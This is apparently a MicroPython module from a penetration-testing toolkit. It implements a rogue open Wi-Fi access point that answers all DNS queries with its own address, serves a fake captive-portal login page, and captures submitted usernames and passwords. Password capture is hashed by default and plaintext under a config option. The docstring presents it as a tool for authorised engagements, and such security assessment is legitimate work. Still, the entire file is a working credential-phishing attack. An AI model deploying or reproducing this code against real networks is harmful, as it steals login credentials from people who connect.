"""Rogue access point with a captive portal.

Demonstrates one specific finding: that staff will type credentials into a
network that merely looks familiar. The C3 stands up an open access point,
answers every DNS query with its own address so any request triggers the
operating system's captive-portal check, and serves a login page.

What it does **not** do is impersonate a specific real organisation. The
portal template ships generic, and the SSID is whatever you configure. Making
a convincing replica of a particular company's login page is the operator's
decision on their own engagement, made against their own authorisation — not
something the toolkit should ship ready to run.

Captured credentials follow the same rule as the Responder bridge: a SHA-256
fingerprint by default, the material itself only when the config says so, and
the event records which you chose.
"""

import gc
import hashlib
import socket
import time

import network
import ubinascii

DNS_PORT = 53
HTTP_PORT = 80
AP_IP = "192.168.4.1"

# Bounded: a portal left running in a busy area will collect duplicates, and
# the board has ~100 KB of usable heap.
MAX_CAPTURES = 60

PORTAL_PAGE = """<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title><style>
body{{font-family:-apple-system,system-ui,sans-serif;background:#f4f5f7;
margin:0;display:grid;place-items:center;min-height:100vh}}
.card{{background:#fff;padding:2rem;border-radius:12px;max-width:22rem;
width:90%;box-shadow:0 2px 12px rgba(0,0,0,.08)}}
h1{{font-size:1.1rem;margin:0 0 .3rem}}p{{color:#666;font-size:.85rem;
margin:0 0 1.2rem}}input{{width:100%;padding:.65rem;margin:.3rem 0 .9rem;
border:1px solid #ccc;border-radius:6px;font-size:1rem;box-sizing:border-box}}
button{{width:100%;padding:.7rem;background:#0b5fff;color:#fff;border:0;
border-radius:6px;font-size:1rem;font-weight:600}}
</style></head><body><div class="card">
<h1>{title}</h1><p>{subtitle}</p>
<form method="post" action="/login">
<label>Username</label><input name="username" autocapitalize="off" required>
<label>Password</label><input name="password" type="password" required>
<button type="submit">Connect</button></form>
</div></body></html>"""

DONE_PAGE = """<!DOCTYPE html><html><head><meta charset="utf-8">
<title>{title}</title></head><body style="font-family:system-ui;padding:2rem">
<h2>Connecting…</h2><p>{message}</p></body></html>"""


def _fingerprint(text):
    digest = hashlib.sha256(text.encode()).digest()
    return ubinascii.hexlify(digest).decode()


def _unquote_plus(value):
    """Percent-decode a form field. MicroPython has no urllib."""
    value = value.replace("+", " ")
    out, i = "", 0
    while i < len(value):
        if value[i] == "%" and i + 2 < len(value):
            try:
                out += chr(int(value[i + 1:i + 3], 16))
                i += 3
                continue
            except ValueError:
                pass
        out += value[i]
        i += 1
    return out


def parse_form(body):
    fields = {}
    for pair in body.split("&"):
        key, _, value = pair.partition("=")
        if key:
            fields[_unquote_plus(key)] = _unquote_plus(value)
    return fields


class CaptivePortal:
    def __init__(self, ssid, title="Wi-Fi Login", subtitle="",
                 channel=6, include_material=False, on_capture=None):
        self.ssid = ssid
        self.title = title
        self.subtitle = subtitle or "Sign in to continue to the internet."
        self.channel = channel
        self.include_material = include_material
        self.on_capture = on_capture
        self.captures = []
        self.clients_seen = set()
        self._ap = None
        self._dns = None
        self._http = None

    # -- lifecycle --------------------------------------------------------

    def start(self):
        self._ap = network.WLAN(network.AP_IF)
        self._ap.active(True)
        # Open network on purpose: a portal that demands a password before
        # showing the portal defeats the point.
        self._ap.config(essid=self.ssid, authmode=network.AUTH_OPEN,
                        channel=self.channel)
        try:
            self._ap.ifconfig((AP_IP, "255.255.255.0", AP_IP, AP_IP))
        except OSError:
            pass

        self._dns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._dns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._dns.bind(("0.0.0.0", DNS_PORT))
        self._dns.settimeout(0.05)

        self._http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._http.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._http.bind(("0.0.0.0", HTTP_PORT))
        self._http.listen(4)
        self._http.settimeout(0.05)

        print("portal up: SSID", self.ssid, "at", AP_IP)

    def stop(self):
        for sock in (self._dns, self._http):
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass
        if self._ap:
            self._ap.active(False)

    # -- DNS --------------------------------------------------------------

    def _serve_dns(self):
        """Answer every query with our own address.

        This is what makes phones and laptops pop the "sign in to network"
        notification: their captive-portal probe resolves here and does not
        return what they expect.
        """
        try:
            query, addr = self._dns.recvfrom(256)
        except (OSError, AttributeError):
            return
        if len(query) < 12:
            return
        # Echo the transaction ID, set response flags, one question, one answer.
        response = bytearray(query[:2])
        response += b"\x81\x80"
        response += query[4:6]          # QDCOUNT unchanged
        response += b"\x00\x01"         # ANCOUNT = 1
        response += b"\x00\x00\x00\x00"
        response += query[12:]          # original question
        response += b"\xc0\x0c"         # pointer to the question name
        response += b"\x00\x01\x00\x01" # type A, class IN
        response += b"\x00\x00\x00\x3c" # TTL 60
        response += b"\x00\x04"
        response += bytes(int(octet) for octet in AP_IP.split("."))
        try:
            self._dns.sendto(response, addr)
        except OSError:
            pass

    # -- HTTP -------------------------------------------------------------

    def _serve_http(self):
        try:
            conn, addr = self._http.accept()
        except (OSError, AttributeError):
            return
        conn.settimeout(2)
        try:
            raw = conn.recv(1400)
            if not raw:
                return
            request = raw.decode("utf-8", "replace")
            head, _, body = request.partition("\r\n\r\n")
            line = head.split("\r\n", 1)[0]
            method, _, rest = line.partition(" ")
            path = rest.split(" ")[0] if rest else "/"
            self.clients_seen.add(addr[0])

            if method == "POST" and path.startswith("/login"):
                # A short body may still be arriving.
                if "content-length:" in head.lower():
                    for header in head.split("\r\n"):
                        if header.lower().startswith("content-length:"):
                            want = int(header.split(":", 1)[1].strip() or 0)
                            while len(body) < want:
                                more = conn.recv(512)
                                if not more:
                                    break
                                body += more.decode("utf-8", "replace")
                            break
                self._capture(parse_form(body), addr[0])
                page = DONE_PAGE.format(
                    title=self.title,
                    message="Thanks — you should have internet access shortly.")
            else:
                page = PORTAL_PAGE.format(title=self.title,
                                          subtitle=self.subtitle)

            conn.send(b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
                      b"Cache-Control: no-store\r\nConnection: close\r\n\r\n")
            conn.send(page.encode())
        except (OSError, ValueError, UnicodeError):
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass

    def _capture(self, fields, client_ip):
        username = (fields.get("username") or "").strip()[:120]
        password = fields.get("password") or ""
        if not username and not password:
            return
        if len(self.captures) >= MAX_CAPTURES:
            self.captures.pop(0)

        record = {
            "credential_format": "captive-portal",
            "account": username,
            "source_host": client_ip,
            "capture_method": "rogue_ap",
            "ssid": self.ssid,
            "fingerprint": _fingerprint(username + ":" + password),
            "password_length": len(password),
            "material_included": self.include_material,
        }
        if self.include_material:
            record["material"] = password
        self.captures.append(record)
        print("captured:", username, "from", client_ip)
        if self.on_capture:
            self.on_capture(record)

    # -- run --------------------------------------------------------------

    def run(self, seconds=None):
        """Service DNS and HTTP until the time is up or Ctrl-C."""
        self.start()
        deadline = time.time() + seconds if seconds else None
        try:
            while deadline is None or time.time() < deadline:
                self._serve_dns()
                self._serve_http()
                if len(self.captures) % 8 == 0:
                    gc.collect()
                time.sleep_ms(10)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
        return self.captures
